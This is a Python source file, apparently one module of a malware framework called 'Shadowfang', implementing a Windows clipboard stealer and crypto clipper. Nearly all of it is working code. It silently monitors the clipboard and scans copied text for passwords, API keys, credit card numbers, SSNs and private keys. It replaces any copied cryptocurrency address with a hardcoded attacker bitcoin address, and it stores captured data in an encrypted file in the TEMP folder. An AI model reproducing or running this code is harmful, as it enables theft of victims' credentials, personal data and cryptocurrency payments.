#!/usr/bin/env python3
"""
SHADOWFANG MODULES - CLIPBOARD.PY
Clipboard capture and hijacking module
Monitors clipboard, captures copied data, detects sensitive information
"""

import os
import sys
import time
import json
import base64
import hashlib
import threading
import subprocess
import ctypes
from ctypes import wintypes
from datetime import datetime
from core import CoreUtils, WinAPI, Constants, logger

# ==================== CLIPBOARD CONSTANTS ====================

class ClipboardConstants:
    """Clipboard configuration"""
    
    # Monitoring
    MONITOR_INTERVAL = 0.5  # Check every 500ms
    HISTORY_SIZE = 100  # Max entries to keep
    MAX_TEXT_LENGTH = 10000  # Max text length to capture
    
    # Output
    OUTPUT_DIR = os.path.join(
        os.environ.get('TEMP', 'C:\\Windows\\Temp'),
        'clipboard_data'
    )
    HISTORY_FILE = "clipboard_history.json"
    
    # Sensitive patterns
    PATTERNS = {
        'bitcoin_address': r'\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b',
        'ethereum_address': r'\b0x[a-fA-F0-9]{40}\b',
        'credit_card': r'\b\d{4}[- ]?\d{4}[- ]?\d{4}[- ]?\d{4}\b',
        'private_key': r'\b(5[HJK][1-9A-HJ-NP-Za-km-z]{49,51}|[KL][1-9A-HJ-NP-Za-km-z]{51,52})\b',
        'email': r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',
        'password': r'(?i)\b(password|passwd|pwd)\s*[:=]\s*\S+\b',
        'api_key': r'(?i)\b(api[_-]?key|apikey|token)\s*[:=]\s*\S+\b',
        'ssn': r'\b\d{3}-\d{2}-\d{4}\b',
        'phone': r'\b\+?\d{10,15}\b',
        'url': r'\bhttps?://[^\s]+\b'
    }

# ==================== WINDOWS CLIPBOARD API ====================

class WindowsClipboardAPI:
    """Windows clipboard API wrapper"""
    
    def __init__(self):
        self.user32 = ctypes.windll.user32
        self.kernel32 = ctypes.windll.kernel32
        self.clipboard_open = False
    
    def open_clipboard(self):
        """Open clipboard for reading"""
        try:
            result = self.user32.OpenClipboard(None)
            if result:
                self.clipboard_open = True
            return result
        except:
            return False
    
    def close_clipboard(self):
        """Close clipboard"""
        try:
            if self.clipboard_open:
                self.user32.CloseClipboard()
                self.clipboard_open = False
            return True
        except:
            return False
    
    def get_clipboard_text(self):
        """Get text from clipboard"""
        try:
            if not self.open_clipboard():
                return None
            
            # CF_UNICODETEXT = 13
            handle = self.user32.GetClipboardData(13)
            
            if not handle:
                self.close_clipboard()
                return None
            
            # Lock global memory
            self.kernel32.GlobalLock.restype = ctypes.c_void_p
            pointer = self.kernel32.GlobalLock(handle)
            
            if not pointer:
                self.close_clipboard()
                return None
            
            # Read string
            text = ctypes.wstring_at(pointer)
            
            # Unlock memory
            self.kernel32.GlobalUnlock(handle)
            
            self.close_clipboard()
            
            return text
            
        except:
            self.close_clipboard()
            return None
    
    def get_clipboard_image(self):
        """Get image from clipboard"""
        try:
            if not self.open_clipboard():
                return None
            
            # CF_BITMAP = 2
            handle = self.user32.GetClipboardData(2)
            
            if not handle:
                self.close_clipboard()
                return None
            
            self.close_clipboard()
            
            # Convert bitmap handle to data
            return self._bitmap_to_bytes(handle)
            
        except:
            self.close_clipboard()
            return None
    
    def _bitmap_to_bytes(self, bitmap_handle):
        """Convert bitmap to bytes"""
        try:
            from PIL import ImageGrab
            
            # Use PIL to grab from clipboard
            image = ImageGrab.grabclipboard()
            
            if image:
                import io
                buffer = io.BytesIO()
                image.save(buffer, format='PNG')
                return buffer.getvalue()
            
            return None
        except:
            return None
    
    def get_clipboard_files(self):
        """Get file list from clipboard"""
        try:
            if not self.open_clipboard():
                return []
            
            # CF_HDROP = 15
            handle = self.user32.GetClipboardData(15)
            
            if not handle:
                self.close_clipboard()
                return []
            
            # Get file count
            file_count = self.kernel32.DragQueryFileW(handle, 0xFFFFFFFF, None, 0)
            
            files = []
            
            for i in range(file_count):
                # Get file path
                buffer = ctypes.create_unicode_buffer(260)
                self.kernel32.DragQueryFileW(handle, i, buffer, 260)
                files.append(buffer.value)
            
            self.close_clipboard()
            
            return files
            
        except:
            self.close_clipboard()
            return []
    
    def set_clipboard_text(self, text):
        """Set clipboard text (for hijacking)"""
        try:
            if not self.open_clipboard():
                return False
            
            # Empty clipboard
            self.user32.EmptyClipboard()
            
            # Allocate global memory
            text_bytes = (text + '\0').encode('utf-16-le')
            handle = self.kernel32.GlobalAlloc(0x0042, len(text_bytes))  # GMEM_MOVEABLE | GMEM_ZEROINIT
            
            if not handle:
                self.close_clipboard()
                return False
            
            # Lock and write
            pointer = self.kernel32.GlobalLock(handle)
            ctypes.memmove(pointer, text_bytes, len(text_bytes))
            self.kernel32.GlobalUnlock(handle)
            
            # Set clipboard data
            self.user32.SetClipboardData(13, handle)  # CF_UNICODETEXT
            
            self.close_clipboard()
            return True
            
        except:
            self.close_clipboard()
            return False

# ==================== PATTERN DETECTOR ====================

class PatternDetector:
    """Detect sensitive information patterns in clipboard data"""
    
    def __init__(self):
        self.patterns = ClipboardConstants.PATTERNS
        self.detected_items = []
    
    def detect_patterns(self, text):
        """Detect patterns in text"""
        try:
            import re
            
            found_patterns = []
            
            for pattern_name, pattern_regex in self.patterns.items():
                matches = re.findall(pattern_regex, text)
                
                if matches:
                    found_patterns.append({
                        'pattern': pattern_name,
                        'matches': matches[:10]  # Limit to 10 matches
                    })
            
            if found_patterns:
                self.detected_items.append({
                    'text_preview': text[:100],
                    'patterns': found_patterns,
                    'timestamp': datetime.now().isoformat()
                })
            
            return found_patterns
            
        except:
            return []
    
    def detect_cryptocurrency_address(self, text):
        """Specifically detect cryptocurrency addresses"""
        try:
            import re
            
            addresses = {
                'bitcoin': [],
                'ethereum': [],
                'monero': []
            }
            
            # Bitcoin
            btc_pattern = r'\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b'
            addresses['bitcoin'] = re.findall(btc_pattern, text)
            
            # Ethereum
            eth_pattern = r'\b0x[a-fA-F0-9]{40}\b'
            addresses['ethereum'] = re.findall(eth_pattern, text)
            
            # Monero
            xmr_pattern = r'\b4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}\b'
            addresses['monero'] = re.findall(xmr_pattern, text)
            
            return addresses
            
        except:
            return {}
    
    def detect_password(self, text):
        """Detect password-like strings"""
        try:
            import re
            
            password_patterns = [
                r'(?i)\bpassword\s*[:=]\s*\S+\b',
                r'(?i)\bpasswd\s*[:=]\s*\S+\b',
                r'(?i)\bpwd\s*[:=]\s*\S+\b',
                r'(?i)\bsecret\s*[:=]\s*\S+\b',
                r'(?i)\bkey\s*[:=]\s*\S+\b'
            ]
            
            found = []
            
            for pattern in password_patterns:
                matches = re.findall(pattern, text)
                found.extend(matches)
            
            return found
            
        except:
            return []

# ==================== CLIPBOARD MONITOR ====================

class ClipboardMonitor:
    """Monitor clipboard for changes"""
    
    def __init__(self):
        self.clipboard_api = WindowsClipboardAPI()
        self.pattern_detector = PatternDetector()
        self.history = []
        self.last_content = None
        self.monitoring = False
        self.monitor_thread = None
        self.stop_monitoring_flag = False
        self.capture_count = 0
    
    def start_monitoring(self, interval=0.5):
        """Start clipboard monitoring"""
        if self.monitor_thread and self.monitor_thread.is_alive():
            return True
        
        self.monitoring = True
        self.stop_monitoring_flag = False
        
        def monitor_worker():
            while not self.stop_monitoring_flag:
                try:
                    # Get current clipboard content
                    current_content = self.clipboard_api.get_clipboard_text()
                    
                    # Check if content changed
                    if current_content and current_content != self.last_content:
                        self.last_content = current_content
                        
                        # Process new content
                        self._process_clipboard_data(current_content)
                    
                    time.sleep(interval)
                    
                except:
                    time.sleep(interval)
        
        self.monitor_thread = threading.Thread(target=monitor_worker)
        self.monitor_thread.daemon = True
        self.monitor_thread.start()
        
        logger.info(f"Clipboard monitoring started (interval: {interval}s)")
        return True
    
    def _process_clipboard_data(self, text):
        """Process clipboard data"""
        try:
            # Skip if too long
            if len(text) > ClipboardConstants.MAX_TEXT_LENGTH:
                text = text[:ClipboardConstants.MAX_TEXT_LENGTH]
            
            # Create entry
            entry = {
                'timestamp': datetime.now().isoformat(),
                'text': text,
                'length': len(text),
                'hash': hashlib.md5(text.encode()).hexdigest()
            }
            
            # Detect patterns
            patterns = self.pattern_detector.detect_patterns(text)
            if patterns:
                entry['patterns'] = patterns
            
            # Detect crypto addresses
            crypto_addresses = self.pattern_detector.detect_cryptocurrency_address(text)
            if any(crypto_addresses.values()):
                entry['crypto'] = crypto_addresses
            
            # Add to history
            self.history.append(entry)
            self.capture_count += 1
            
            # Trim history
            if len(self.history) > ClipboardConstants.HISTORY_SIZE:
                self.history = self.history[-ClipboardConstants.HISTORY_SIZE:]
            
            logger.info(f"Clipboard captured: {text[:50]}...")
            
        except:
            pass
    
    def stop_monitoring(self):
        """Stop clipboard monitoring"""
        self.stop_monitoring_flag = True
        
        if self.monitor_thread:
            self.monitor_thread.join(timeout=2)
        
        self.monitoring = False
        logger.info("Clipboard monitoring stopped")
        return True
    
    def capture_now(self):
        """Capture clipboard immediately"""
        try:
            text = self.clipboard_api.get_clipboard_text()
            
            if text:
                self._process_clipboard_data(text)
                return text
            
            return None
            
        except:
            return None
    
    def get_history(self):
        """Get clipboard history"""
        return self.history
    
    def clear_history(self):
        """Clear clipboard history"""
        self.history.clear()
        self.capture_count = 0
        return True

# ==================== CLIPBOARD HIJACKER ====================

class ClipboardHijacker:
    """Hijack clipboard to replace content"""
    
    def __init__(self):
        self.clipboard_api = WindowsClipboardAPI()
        self.hijacking = False
        self.hijack_thread = None
        self.stop_hijack_flag = False
        self.hijacked_count = 0
    
    def start_hijacking(self, replacement_address=None):
        """Start clipboard hijacking"""
        if not replacement_address:
            replacement_address = "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"
        
        self.hijacking = True
        self.stop_hijack_flag = False
        
        def hijack_worker():
            last_content = None
            
            while not self.stop_hijack_flag:
                try:
                    current_content = self.clipboard_api.get_clipboard_text()
                    
                    if current_content and current_content != last_content:
                        last_content = current_content
                        
                        # Check if it's a crypto address
                        crypto_addresses = PatternDetector().detect_cryptocurrency_address(current_content)
                        
                        if any(crypto_addresses.values()):
                            # Replace with our address
                            self.clipboard_api.set_clipboard_text(replacement_address)
                            self.hijacked_count += 1
                            logger.info(f"Clipboard hijacked: replaced crypto address")
                    
                    time.sleep(0.3)
                    
                except:
                    time.sleep(0.3)
        
        self.hijack_thread = threading.Thread(target=hijack_worker)
        self.hijack_thread.daemon = True
        self.hijack_thread.start()
        
        return True
    
    def stop_hijacking(self):
        """Stop clipboard hijacking"""
        self.stop_hijack_flag = True
        
        if self.hijack_thread:
            self.hijack_thread.join(timeout=2)
        
        self.hijacking = False
        return True
    
    def replace_clipboard(self, new_text):
        """Replace clipboard content"""
        return self.clipboard_api.set_clipboard_text(new_text)
    
    def clear_clipboard(self):
        """Clear clipboard"""
        return self.clipboard_api.set_clipboard_text("")

# ==================== CLIPBOARD SAVER ====================

class ClipboardSaver:
    """Save clipboard history to file"""
    
    def __init__(self):
        self.output_dir = ClipboardConstants.OUTPUT_DIR
    
    def save_history(self, history, filename=None):
        """Save clipboard history"""
        try:
            if not filename:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"clipboard_{timestamp}.json"
            
            filepath = os.path.join(self.output_dir, filename)
            
            os.makedirs(self.output_dir, exist_ok=True)
            
            with open(filepath, 'w', encoding='utf-8') as f:
                json.dump(history, f, indent=2, default=str)
            
            logger.info(f"Clipboard history saved: {filepath}")
            return filepath
            
        except:
            return None
    
    def save_encrypted(self, history, encryption_key=None):
        """Save clipboard history encrypted"""
        try:
            import base64
            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
            from cryptography.hazmat.primitives import padding
            
            if not encryption_key:
                encryption_key = os.urandom(32)
            
            json_data = json.dumps(history, default=str).encode()
            
            iv = os.urandom(16)
            
            cipher = Cipher(algorithms.AES(encryption_key), modes.CBC(iv))
            encryptor = cipher.encryptor()
            
            padder = padding.PKCS7(128).padder()
            padded_data = padder.update(json_data) + padder.finalize()
            
            encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filepath = os.path.join(self.output_dir, f"clipboard_{timestamp}.enc")
            
            with open(filepath, 'wb') as f:
                f.write(iv + encrypted_data)
            
            return filepath
            
        except:
            return None

# ==================== MAIN CLIPBOARD MANAGER ====================

class ClipboardManager:
    """Main clipboard capture orchestrator"""
    
    def __init__(self):
        self.clipboard_api = WindowsClipboardAPI()
        self.monitor = ClipboardMonitor()
        self.hijacker = ClipboardHijacker()
        self.saver = ClipboardSaver()
        self.pattern_detector = PatternDetector()
        self.active = False
    
    def start_capture(self, monitor_interval=0.5):
        """Start clipboard capture"""
        logger.info("Starting clipboard capture...")
        
        self.monitor.start_monitoring(monitor_interval)
        
        self.active = True
        return True
    
    def start_hijacking(self, replacement_address=None):
        """Start clipboard hijacking"""
        return self.hijacker.start_hijacking(replacement_address)
    
    def stop_all(self):
        """Stop all clipboard operations"""
        self.monitor.stop_monitoring()
        self.hijacker.stop_hijacking()
        
        self.active = False
        logger.info("Clipboard operations stopped")
        return True
    
    def capture_now(self):
        """Capture clipboard immediately"""
        return self.monitor.capture_now()
    
    def get_history(self):
        """Get clipboard history"""
        return self.monitor.get_history()
    
    def save_history(self):
        """Save clipboard history"""
        return self.saver.save_history(self.monitor.get_history())
    
    def get_status(self):
        """Get clipboard manager status"""
        return {
            'active': self.active,
            'monitoring': self.monitor.monitoring,
            'hijacking': self.hijacker.hijacking,
            'captured_entries': self.monitor.capture_count,
            'hijacked_count': self.hijacker.hijacked_count,
            'detected_patterns': len(self.pattern_detector.detected_items)
        }
    
    def cleanup(self, max_age_hours=24):
        """Clean up old clipboard data"""
        try:
            cutoff_time = time.time() - (max_age_hours * 3600)
            
            if os.path.exists(self.saver.output_dir):
                for file in os.listdir(self.saver.output_dir):
                    filepath = os.path.join(self.saver.output_dir, file)
                    
                    if os.path.getmtime(filepath) < cutoff_time:
                        os.remove(filepath)
            
            return True
        except:
            return False

# ==================== SINGLETON INSTANCE ====================

clipboard_manager = ClipboardManager()

# ==================== EXPORT ====================

__all__ = [
    'WindowsClipboardAPI',
    'PatternDetector',
    'ClipboardMonitor',
    'ClipboardHijacker',
    'ClipboardSaver',
    'ClipboardManager',
    'clipboard_manager'
]